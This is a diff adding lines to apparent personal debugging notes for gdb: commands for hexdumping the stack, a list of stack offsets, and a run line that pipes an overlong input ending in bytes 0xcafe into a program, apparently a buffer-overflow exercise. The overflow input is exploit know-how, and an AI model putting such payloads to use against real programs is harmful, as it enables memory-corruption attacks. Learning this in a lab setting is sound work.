@@ -29,5 +29,18 @@ info breakpoints
 
 ```
 
+### Show the hexdump of stack. 
+
+```
+hexdump byte $rsp
+hexdump byte $rbp
+```
+
+rbp-0x4
+rbp-0x8
+rbp-0x110
 
 
+```
+ run <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA' + b'\xca\xfe')")
+```
